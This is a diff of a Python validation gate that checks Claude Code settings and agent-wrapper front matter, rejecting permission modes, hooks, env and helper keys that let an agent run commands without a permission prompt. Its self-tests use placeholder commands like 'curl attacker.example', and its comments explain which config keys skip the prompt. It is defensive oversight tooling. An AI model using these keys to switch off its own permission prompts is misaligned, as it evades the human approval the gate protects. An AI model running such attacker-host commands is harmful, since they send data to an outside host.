@@ -12,7 +12,13 @@ lightweight, re-runnable gate so the three reconciliations below — plus a vali
      matching `persona:<slug>` label and vice-versa. The roster is NON-RECURSIVE — only
      wrappers directly in `.claude/agents/` are roster entries; a `name:`-bearing file
      nested in a subdirectory is an INTEGRITY ERROR (the workflow path filter would still
-     ship it), not a silently ignored file. The GitHub 50-character label cap forces
+     ship it), not a silently ignored file. Each wrapper's front matter is also held to a
+     POLICY: `permissionMode` may only be `default` or `plan` (`bypassPermissions` and the
+     other prompt-skipping modes auto-run commands the settings allow/deny lists never see),
+     no `hooks`/`mcpServers`/`isolation`/`env` key may appear (`isolation: worktree` runs
+     `git worktree add` with no prompt), and any other unknown key is rejected —
+     a wrapper is a persona brief, not an execution-configuration surface. The GitHub
+     50-character label cap forces
      exactly one documented truncation (the trailing `-engineer` is dropped from
      `persona:dotnet-vectorized-columnar-compute-engineer`); that truncation is allowed ONLY
      when `label-taxonomy.md` records it. The roster is reconciled against BOTH the persona
@@ -37,7 +43,8 @@ CASE-INSENSITIVELY, because on a case-insensitive filesystem `Bash(GH api:*)` st
 to the real `gh`); any WILDCARD or TOOL-WIDE Bash grant (`Bash`, `Bash()`, `Bash(*)`,
 `Bash(:*)`, and any command still holding a `*` once the trailing `:*` argument wildcard is
 stripped — Claude Code reads such a `*` as a GLOB, so `Bash(gh *)` matches `^gh.*$` and
-auto-runs `gh api`); and a `permissions.defaultMode` of `bypassPermissions` or `dontAsk`.
+auto-runs `gh api`); and any `permissions.defaultMode` other than `default`/`plan`
+(`bypassPermissions` and `dontAsk` skip every prompt; `acceptEdits` auto-approves file writes).
 The KEY SURFACE is an allowlist rather than a blocklist: only `permissions` plus the inert
 knobs `$schema`, `model`, `cleanupPeriodDays`, `includeCoAuthoredBy`, `attribution`,
 `outputStyle`, `language`, `spinnerTipsEnabled` may appear at top level, and `permissions`
@@ -170,6 +177,11 @@ REQUIRED_DENY_ENTRIES = (
 # allow/deny refinement above moot (both were proven to auto-run commands), so neither may
 # appear in the tracked project settings.
 FORBIDDEN_DEFAULT_MODES = ("bypassPermissions", "dontAsk")
+# ...and, like the key surface, `defaultMode` is policed by an ALLOWLIST rather than only that
+# blocklist: `acceptEdits` still auto-approves every file write with no prompt, which in a
+# TRACKED settings file means another author's branch can edit the worktree unattended, so
+# only the two fully prompting modes may appear (absent is fine — the session default applies).
+ALLOWED_DEFAULT_MODES = ("default", "plan")
 
 # The tracked project settings are policed by an ALLOWLIST, not a blocklist. Claude Code keeps
 # adding settings keys whose value is a COMMAND STRING that runs with no permission prompt
@@ -206,6 +218,49 @@ HELPER_COMMAND_KEYS = (
     "statusLine",
     "subagentStatusLine",
     "fileSuggestion",
+)
+
+# --- .claude/agents/*.md front-matter policy ---------------------------------------------
+# A persona wrapper is a BRIEF, not an execution-configuration surface. Claude Code reads
+# several wrapper front-matter keys as runtime configuration, and `permissionMode` is the
+# sharpest: `bypassPermissions` (also `acceptEdits`, `dontAsk`, `auto`) makes every tool call
+# in that subagent run with NO permission prompt, so a tracked wrapper can auto-run a command
+# the `.claude/settings.json` allow/deny policy above would never have granted. The roster
+# gate previously read only `name:`, so such a wrapper shipped unseen (FINAL-F1). Only the
+# prompting modes may appear in a tracked wrapper; ABSENT is fine (it inherits the session).
+ALLOWED_AGENT_PERMISSION_MODES = ("default", "plan")
+# Front-matter keys that carry executable commands, connect external servers/environment, or
+# provision worktrees. They are rejected by name (they are absent from the allowlist below
+# too, but the specific message says WHY) — put them in untracked local configuration if a
+# particular worktree genuinely needs them. `isolation: worktree` belongs here because it was
+# proven to run `git worktree add` with NO permission prompt — the very command the settings
+# allow policy (:data:`FORBIDDEN_ALLOW_COMMANDS`) refuses to auto-allow.
+FORBIDDEN_AGENT_KEYS = ("hooks", "mcpServers", "isolation", "env")
+# Why each forbidden key is rejected, appended to its message so the report is actionable.
+FORBIDDEN_AGENT_KEY_REASONS = {
+    "hooks": "it runs arbitrary commands on tool events with no permission prompt",
+    "mcpServers": "it launches/connects an external MCP server outside the permission gate",
+    "isolation": "it provisions a worktree, running `git worktree add` with no permission "
+                 "prompt — a command the settings allow policy refuses to auto-allow",
+    "env": "it overrides the environment of every auto-allowed command (PATH, GIT_*, ...)",
+}
+# Same allowlist discipline as the settings check: a wrapper may carry only these inert,
+# brief-shaped keys (each probed against the CLI as non-executing), so a future Claude Code
+# release that adds a command-valued wrapper key cannot widen the surface behind this gate's
+# back. `isolation`/`hooks`/`mcpServers`/`env` are deliberately NOT here.
+ALLOWED_AGENT_KEYS = (
+    "name",
+    "description",
+    "tools",
+    "disallowedTools",
+    "model",
+    "permissionMode",
+    "color",
+    "skills",
+    "effort",
+    "maxTurns",
+    "memory",
+    "background",
 )
 
 
@@ -264,25 +319,83 @@ def resolve_ref(explicit: "str | None") -> "str | None":
 
 # --- Local roster reader -----------------------------------------------------------------
 
-def _read_frontmatter_name(path: str) -> "str | None":
-    """Return the `name:` value from a YAML front-matter block, or None if absent."""
+def _read_frontmatter(path: str) -> "dict[str, str]":
+    """Return the TOP-LEVEL `key: value` pairs of a YAML front-matter block ({} if absent).
+
+    Stdlib-only and deliberately shallow (no PyYAML): only lines between the opening and
+    closing `---` fences that start a key at COLUMN 0 are read, so an indented continuation
+    or a nested mapping entry cannot be mistaken for a top-level key. Values are returned as
+    written (with surrounding quotes stripped); a nested block's value is the empty string,
+    which is enough for the policy in :func:`validate_agent_frontmatter` — that policy cares
+    about which keys are PRESENT plus the scalar `permissionMode`.
+    """
     try:
         with open(path, "r", encoding="utf-8") as handle:
             lines = handle.read().splitlines()
     except OSError:
-        return None
+        return {}
     if not lines or lines[0].strip() != "---":
-        return None
+        return {}
+    frontmatter: "dict[str, str]" = {}
     for line in lines[1:]:
         if line.strip() == "---":
             break
-        match = re.match(r"^name:\s*(.+?)\s*$", line)
-        if match:
-            value = match.group(1).strip()
-            if len(value) >= 2 and value[0] in "\"'" and value[-1] == value[0]:
-                value = value[1:-1]
-            return value
-    return None
+        match = re.match(r"^([A-Za-z_$][\w.$-]*):\s*(.*?)\s*$", line)
+        if not match:
+            continue  # indented continuation, list item, comment, or blank
+        key, value = match.group(1), match.group(2)
+        if len(value) >= 2 and value[0] in "\"'" and value[-1] == value[0]:
+            value = value[1:-1]
+        frontmatter.setdefault(key, value)
+    return frontmatter
+
+
+def validate_agent_frontmatter(path: str, frontmatter: "dict[str, str]") -> "list[str]":
+    """Return policy problems with one wrapper's front matter (empty ⇒ clean).
+
+    A tracked persona wrapper is a BRIEF. Claude Code, however, reads parts of the wrapper
+    front matter as RUNTIME CONFIGURATION, so an innocuous-looking `.claude/agents/*.md` edit
+    can switch the permission prompt off for that subagent or attach an MCP server / hook —
+    none of which the `.claude/settings.json` policy in :func:`validate_settings` can see.
+    Three rules, checked in this order so the specific message wins over the generic one:
+
+    * `permissionMode` must be absent or one of :data:`ALLOWED_AGENT_PERMISSION_MODES`
+      (`default`, `plan`). `bypassPermissions`/`acceptEdits`/`dontAsk`/`auto` all skip the
+      prompt, which was proven to auto-run a forbidden command with no prompt (FINAL-F1);
+    * no key in :data:`FORBIDDEN_AGENT_KEYS` (`hooks`, `mcpServers`, `isolation`, `env`) —
+      those are executable/config-bearing; `isolation: worktree` in particular runs
+      `git worktree add` with no permission prompt;
+    * every remaining key must be in :data:`ALLOWED_AGENT_KEYS`; an unknown key is rejected
+      on sight, because a key this gate has never heard of may execute something.
+
+    Reported as roster INTEGRITY problems (they redden `roster<->documented-labels`, like a
+    nested wrapper does), so the gate fails on the branch that introduces the wrapper.
+    """
+    problems: "list[str]" = []
+    mode = frontmatter.get("permissionMode")
+    if mode is not None and mode not in ALLOWED_AGENT_PERMISSION_MODES:
+        problems.append(
+            f"agent wrapper {path!r} sets permissionMode {mode!r}; tracked persona wrappers "
+            f"may only use default or plan "
+            f"(bypassPermissions/acceptEdits/dontAsk/auto skip prompts)"
+        )
+    for key in frontmatter:
+        if key in FORBIDDEN_AGENT_KEYS:
+            reason = FORBIDDEN_AGENT_KEY_REASONS.get(key)
+            because = f" ({reason})" if reason else ""
+            problems.append(
+                f"agent wrapper {path!r} defines {key!r}, which is executable/config-bearing"
+                f"{because}; tracked persona wrappers may carry only name, description, "
+                f"tools, model, permissionMode"
+            )
+        elif key not in ALLOWED_AGENT_KEYS:
+            problems.append(
+                f"agent wrapper {path!r} carries unknown front-matter key {key!r}; tracked "
+                f"persona wrappers may carry only "
+                f"{', '.join(repr(k) for k in ALLOWED_AGENT_KEYS)} — a key this gate does not "
+                f"understand may configure execution with no permission prompt"
+            )
+    return problems
 
 
 def read_roster(agents_dir: str) -> "tuple[set[str], list[str]]":
@@ -296,6 +409,11 @@ def read_roster(agents_dir: str) -> "tuple[set[str], list[str]]":
 
     The slug is the front-matter `name:` (canonical); the filename stem must match it, and a
     mismatch is reported as an integrity problem so a mislabeled wrapper cannot hide.
+
+    Each top-level wrapper's front matter is additionally held to the policy in
+    :func:`validate_agent_frontmatter` (no prompt-skipping `permissionMode`, no
+    `hooks`/`mcpServers`/`env`, no unknown keys); violations are returned as integrity
+    problems alongside the naming ones.
 
     The roster itself is NON-RECURSIVE — only files sitting directly in ``agents_dir`` count.
     The scan, however, IS recursive, because the workflow path filter (`.claude/agents/**`)
@@ -324,7 +442,8 @@ def read_roster(agents_dir: str) -> "tuple[set[str], list[str]]":
     problems: "list[str]" = []
     first_seen: "dict[str, str]" = {}
     for path in all_paths:
-        name = _read_frontmatter_name(path)
+        frontmatter = _read_frontmatter(path)
+        name = frontmatter.get("name") or None
         if not name:
             continue  # not a persona wrapper (no front-matter `name:`) — ignore
         relative = os.path.relpath(path, agents_dir)
@@ -342,6 +461,7 @@ def read_roster(agents_dir: str) -> "tuple[set[str], list[str]]":
                 f"agent wrapper {path!r} front-matter name {name!r} does not match its "
                 f"filename stem {stem!r} — rename one so the persona slug is unambiguous"
             )
+        problems.extend(validate_agent_frontmatter(path, frontmatter))
         if name in slugs:
             problems.append(
                 f"duplicate persona slug {name!r} — declared by both "
@@ -650,7 +770,10 @@ def validate_settings(path: str = DEFAULT_SETTINGS) -> "list[str]":
     * no blanket wildcard (``Bash(*)``, ``Bash(:*)``, an empty command) and no GLOB — a ``*``
       surviving anywhere in the command after the trailing ``:*`` is stripped, e.g.
       ``Bash(gh *)`` / ``Bash(gh api*)``, is matched as ``^gh.*$``;
-    * ``permissions.defaultMode`` is not one of :data:`FORBIDDEN_DEFAULT_MODES`;
+    * ``permissions.defaultMode``, when present, is one of :data:`ALLOWED_DEFAULT_MODES`
+      (``default``/``plan``) — the two prompt-disabling modes in
+      :data:`FORBIDDEN_DEFAULT_MODES` keep their sharper message, and every other value
+      (notably ``acceptEdits``, which auto-approves file writes) is rejected too;
     * the key surface is an ALLOWLIST, not a blocklist: only :data:`ALLOWED_TOP_LEVEL_KEYS`
       may appear at top level and only :data:`ALLOWED_PERMISSION_KEYS` (plus the specifically
       rejected ``additionalDirectories``) inside ``permissions``. Every EXECUTABLE-VALUED key
@@ -709,10 +832,17 @@ def validate_settings(path: str = DEFAULT_SETTINGS) -> "list[str]":
                 f"allow list already approved with NO permission prompt"
             )
         elif key in HELPER_COMMAND_KEYS:
+            # The parenthetical is only TRUE of apiKeyHelper (it runs at CLI startup, before
+            # any tool call); the rest run on their own trigger, so they get the plain clause.
+            startup = (
+                " (apiKeyHelper runs at CLI startup, before any tool call)"
+                if key == "apiKeyHelper"
+                else ""
+            )
             problems.append(
                 f"{path}: project settings must not define {key!r}; put it in "
-                f"settings.local.json — it runs a command with no permission prompt "
-                f"(apiKeyHelper runs at CLI startup, before any tool call)"
+                f"settings.local.json — it runs a command with no permission prompt"
+                f"{startup}"
             )
         else:
             problems.append(
@@ -735,13 +865,25 @@ def validate_settings(path: str = DEFAULT_SETTINGS) -> "list[str]":
             f"{', '.join(repr(k) for k in ALLOWED_PERMISSION_KEYS)}"
         )
 
-    default_mode = permissions.get("defaultMode")
-    if isinstance(default_mode, str) and default_mode in FORBIDDEN_DEFAULT_MODES:
-        problems.append(
-            f"{path}: 'permissions.defaultMode' is {default_mode!r} — that mode skips the "
-            f"permission prompt for every tool call, which makes the allow/deny lists below "
-            f"moot; remove it and let the prompting default modes apply"
-        )
+    if "defaultMode" in permissions:
+        default_mode = permissions.get("defaultMode")
+        if isinstance(default_mode, str) and default_mode in FORBIDDEN_DEFAULT_MODES:
+            problems.append(
+                f"{path}: 'permissions.defaultMode' is {default_mode!r} — that mode skips the "
+                f"permission prompt for every tool call, which makes the allow/deny lists below "
+                f"moot; remove it and let the prompting default modes apply"
+            )
+        elif not isinstance(default_mode, str) or default_mode not in ALLOWED_DEFAULT_MODES:
+            # e.g. `acceptEdits`: still prompts for Bash, but auto-approves every file write.
+            # In the TRACKED settings that is a checked-out branch editing the worktree with
+            # no prompt, so the allowlist admits only the fully prompting modes.
+            problems.append(
+                f"{path}: 'permissions.defaultMode' is {default_mode!r} — the tracked project "
+                f"settings may only set "
+                f"{' or '.join(repr(m) for m in ALLOWED_DEFAULT_MODES)} (any other mode "
+                f"auto-approves tool calls, e.g. 'acceptEdits' auto-approves file writes); "
+                f"put it in settings.local.json if a local worktree needs it"
+            )
     if "additionalDirectories" in permissions:
         problems.append(
             f"{path}: 'permissions.additionalDirectories' is set "
@@ -942,8 +1084,9 @@ def settings_result(path: str) -> Result:
         f"{path}: allow/deny are string lists; no allow entry matches (case-insensitively) "
         f"the {len(FORBIDDEN_ALLOW_COMMANDS)} mutating git/gh prefixes in "
         f"FORBIDDEN_ALLOW_COMMANDS and none is a wildcard/glob or tool-wide Bash grant; no "
-        f"defaultMode bypass; only 'permissions' (plus the {len(ALLOWED_TOP_LEVEL_KEYS) - 1} "
-        f"inert keys) at top level and only allow/deny/defaultMode inside it, so no "
+        f"defaultMode outside default/plan; only 'permissions' (plus `$schema` and the "
+        f"{len(ALLOWED_TOP_LEVEL_KEYS) - 2} inert keys) at top level and only "
+        f"allow/deny/defaultMode inside it, so no "
         f"executable-valued key (hooks, env, apiKeyHelper, statusLine, ...) and no "
         f"additionalDirectories; {len(REQUIRED_DENY_ENTRIES)} required deny entries present. "
         f"Other allow entries are not policed."
@@ -1374,6 +1517,110 @@ def _selftest() -> int:
             "symlink loop adds no extra nested-wrapper problems (link is not descended)",
         )
 
+    # (f4) FINAL-F1: the wrapper FRONT MATTER is policed, not just its `name:`. A tracked
+    # `.claude/agents/*.md` is a brief, but Claude Code reads several front-matter keys as
+    # runtime configuration: `permissionMode: bypassPermissions` was proven to auto-run a
+    # forbidden command with NO prompt, and `isolation: worktree` to run `git worktree add`
+    # with no prompt — both invisible to the settings allow/deny policy. The literal tables
+    # below kill the "shrink the table" mutant (the loops that follow are driven BY the
+    # tables, so a shrunken table would test a weaker policy and stay green); the fixtures
+    # kill "delete the permissionMode branch" / "delete the forbidden-key branch".
+    check(
+        tuple(ALLOWED_AGENT_PERMISSION_MODES) == ("default", "plan"),
+        "ALLOWED_AGENT_PERMISSION_MODES still admits only the two prompting modes",
+    )
+    check(
+        tuple(FORBIDDEN_AGENT_KEYS) == ("hooks", "mcpServers", "isolation", "env"),
+        "FORBIDDEN_AGENT_KEYS still lists every executable/config-bearing wrapper key",
+    )
+    check(
+        tuple(ALLOWED_AGENT_KEYS) == (
+            "name",
+            "description",
+            "tools",
+            "disallowedTools",
+            "model",
+            "permissionMode",
+            "color",
+            "skills",
+            "effort",
+            "maxTurns",
+            "memory",
+            "background",
+        ),
+        "ALLOWED_AGENT_KEYS still lists exactly the inert wrapper front-matter keys",
+    )
+
+    def _wrapper_problems(front: str) -> "list[str]":
+        """read_roster problems for a single `agent.md` wrapper with the given front matter."""
+        with tempfile.TemporaryDirectory() as tmp:
+            _wrapper(tmp, "agent.md", f"---\nname: agent\n{front}---\nbody\n")
+            _ok, _slugs, _problems = _read_roster_safe(tmp)
+            return _problems if _ok else ["read_roster raised: " + "; ".join(_problems)]
+
+    check(_wrapper_problems("") == [], "a minimal wrapper (name only) is clean")
+    for _mode in ("default", "plan"):
+        check(
+            _wrapper_problems(f"permissionMode: {_mode}\n") == [],
+            f"wrapper permissionMode: {_mode} is accepted (no false positive)",
+        )
+    for _skipping in ("bypassPermissions", "acceptEdits", "dontAsk", "auto"):
+        _mode_problems = _wrapper_problems(f"permissionMode: {_skipping}\n")
+        check(
+            any(
+                "permissionMode" in p and _skipping in p and "default or plan" in p
+                for p in _mode_problems
+            ),
+            f"wrapper permissionMode: {_skipping} is rejected (skips the permission prompt)",
+        )
+    for _forbidden_key in FORBIDDEN_AGENT_KEYS:
+        _key_problems = _wrapper_problems(f"{_forbidden_key}: something\n")
+        check(
+            any(
+                repr(_forbidden_key) in p and "executable/config-bearing" in p
+                for p in _key_problems
+            ),
+            f"wrapper front-matter key {_forbidden_key!r} is rejected",
+        )
+    check(
+        any(
+            "git worktree add" in p and "no permission prompt" in p
+            for p in _wrapper_problems("isolation: worktree\n")
+        ),
+        "wrapper `isolation: worktree` names the unprompted `git worktree add` it runs",
+    )
+    check(
+        any(
+            "unknown front-matter key" in p and "\'foo\'" in p
+            for p in _wrapper_problems("foo: bar\n")
+        ),
+        "wrapper unknown front-matter key is rejected (future config-bearing keys)",
+    )
+    check(
+        _wrapper_problems(
+            "description: does things\ntools: [Read, Grep]\nmodel: sonnet\n"
+        ) == [],
+        "a realistic wrapper (description/tools/model) stays clean",
+    )
+    # The policy must ride along as a roster INTEGRITY problem, i.e. it must redden the
+    # roster<->documented-labels check exactly like a nested wrapper does — not merely be
+    # available as a function nobody calls. Killing mutant: dropping the call in read_roster.
+    with tempfile.TemporaryDirectory() as tmp:
+        _wrapper(tmp, "product-manager.md",
+                 "---\nname: product-manager\npermissionMode: bypassPermissions\n---\n")
+        _ok, _slugs, _problems = _read_roster_safe(tmp)
+        check(
+            _ok and _slugs == {"product-manager"} and len(_problems) == 1,
+            "a policy-violating wrapper is still a roster entry, plus one integrity problem",
+        )
+        _integrity = _problems + reconcile_roster_labels(
+            _slugs, {"product-manager"}, doc
+        )[0]
+        check(
+            len(_integrity) == 1 and "permissionMode" in _integrity[0],
+            "front-matter policy problems redden roster<->documented-labels",
+        )
+
     # --- R3-F1: validate_settings — the .claude/settings.json permission surface. Fixtures
     # are written to temp files so the checked-in file is never mutated by the selftest.
     def _settings_problems(payload: object) -> "list[str]":
@@ -1487,7 +1734,7 @@ def _selftest() -> int:
         ),
         "REQUIRED_DENY_ENTRIES still lists all 14 required deny entries",
     )
-    _short_deny =[d for d in REQUIRED_DENY_ENTRIES if d != "Bash(git push --force:*)"]
+    _short_deny = [d for d in REQUIRED_DENY_ENTRIES if d != "Bash(git push --force:*)"]
     check(
         any("Bash(git push --force:*)" in p and "missing" in p
             for p in _settings_problems(_settings(deny=_short_deny))),
@@ -1567,12 +1814,28 @@ def _selftest() -> int:
             any("defaultMode" in p and _mode in p for p in _settings_problems(_bypass)),
             f"validate_settings rejects permissions.defaultMode = {_mode!r}",
         )
-    _prompting = _settings()
-    _prompting["permissions"]["defaultMode"] = "acceptEdits"
+    # FINAL-F3: `defaultMode` is an ALLOWLIST too. `acceptEdits` still prompts for Bash but
+    # auto-approves every FILE WRITE, which in the tracked settings means a checked-out
+    # branch edits the worktree unattended — so only the two fully prompting modes pass.
+    # Killing mutant: widening ALLOWED_DEFAULT_MODES (or dropping the else-branch).
     check(
-        _settings_problems(_prompting) == [],
-        "a still-prompting defaultMode ('acceptEdits') is accepted (no false positive)",
+        tuple(ALLOWED_DEFAULT_MODES) == ("default", "plan"),
+        "ALLOWED_DEFAULT_MODES still admits only the two fully prompting modes",
     )
+    _accept_edits = _settings()
+    _accept_edits["permissions"]["defaultMode"] = "acceptEdits"
+    check(
+        any("defaultMode" in p and "acceptEdits" in p and "auto-approves" in p
+            for p in _settings_problems(_accept_edits)),
+        "validate_settings rejects permissions.defaultMode = 'acceptEdits' (auto-writes)",
+    )
+    for _allowed_mode in ALLOWED_DEFAULT_MODES:
+        _prompting = _settings()
+        _prompting["permissions"]["defaultMode"] = _allowed_mode
+        check(
+            _settings_problems(_prompting) == [],
+            f"a fully prompting defaultMode ({_allowed_mode!r}) is accepted (no false positive)",
+        )
     _hooked = _settings()
     _hooked["hooks"] = {
         "PreToolUse": [{"hooks": [{"type": "command", "command": "curl attacker.example"}]}]
@@ -1628,21 +1891,52 @@ def _selftest() -> int:
         any("apiKeyHelper" in p and "CLI startup" in p for p in _settings_problems(_api_helper)),
         "validate_settings rejects `apiKeyHelper` and names the CLI-startup execution",
     )
+    # FINAL-F2: pin the helper table literally AND assert the HELPER-BRANCH text. Every
+    # unknown key is rejected by the allowlist anyway, and the generic message also ends in
+    # "...may execute a command with no permission prompt" — so an assertion on that phrase
+    # alone stayed green when a key was deleted from HELPER_COMMAND_KEYS (it silently
+    # degraded to the generic message). The assertions below require the branch-only wording
+    # ("must not define ... it runs a command with no permission prompt") and require the
+    # generic "unknown top-level key" wording to be ABSENT, so a table shrink fails.
+    check(
+        tuple(HELPER_COMMAND_KEYS) == (
+            "apiKeyHelper",
+            "awsAuthRefresh",
+            "awsCredentialExport",
+            "gcpAuthRefresh",
+            "otelHeadersHelper",
+            "processWrapper",
+            "policyHelpers",
+            "proxyAuthHelper",
+            "statusLine",
+            "subagentStatusLine",
+            "fileSuggestion",
+        ),
+        "HELPER_COMMAND_KEYS still lists every command-valued top-level key",
+    )
     _status = _settings()
     _status["statusLine"] = {"type": "command", "command": "curl attacker.example"}
+    _status_problems = _settings_problems(_status)
     check(
-        any("statusLine" in p and "no permission prompt" in p
-            for p in _settings_problems(_status)),
-        "validate_settings rejects `statusLine` (a helper command, no prompt)",
+        any("statusLine" in p and "it runs a command with no permission prompt" in p
+            for p in _status_problems)
+        and not any("unknown top-level key" in p for p in _status_problems),
+        "validate_settings rejects `statusLine` with the helper message (not the generic one)",
     )
     for _helper in HELPER_COMMAND_KEYS:
         _h = _settings()
         _h[_helper] = "curl attacker.example"
+        _h_problems = _settings_problems(_h)
         check(
-            any(repr(_helper) in p and "no permission prompt" in p
-                for p in _settings_problems(_h)),
-            f"validate_settings rejects the helper-command key {_helper!r}",
+            any(repr(_helper) in p and "it runs a command with no permission prompt" in p
+                for p in _h_problems)
+            and not any("unknown top-level key" in p for p in _h_problems),
+            f"validate_settings rejects the helper-command key {_helper!r} by name",
         )
+    check(
+        not any("CLI startup" in p for p in _status_problems),
+        "the CLI-startup clause is emitted only for apiKeyHelper (statusLine does not claim it)",
+    )
     _benign = _settings()
     _benign["model"] = "opus"
     check(
@@ -1788,8 +2082,8 @@ def main(argv: "list[str] | None" = None) -> int:
         _log(
             f"settings validation PASSED: {args.settings} matches policy — no forbidden "
             f"mutating-command (compared case-insensitively), wildcard/glob or tool-wide "
-            f"allow grant, no defaultMode bypass; only 'permissions' plus the listed inert "
-            f"keys at top level and only allow/deny/defaultMode inside 'permissions', so no "
+            f"allow grant, no defaultMode outside default/plan; only 'permissions' plus "
+            f"`$schema` and the listed inert keys at top level and only allow/deny/defaultMode inside 'permissions', so no "
             f"executable-valued key (hooks, env, apiKeyHelper, statusLine, ...) and no "
             f"additionalDirectories; all required deny entries present "
             f"(allow entries outside those rules are not policed)"
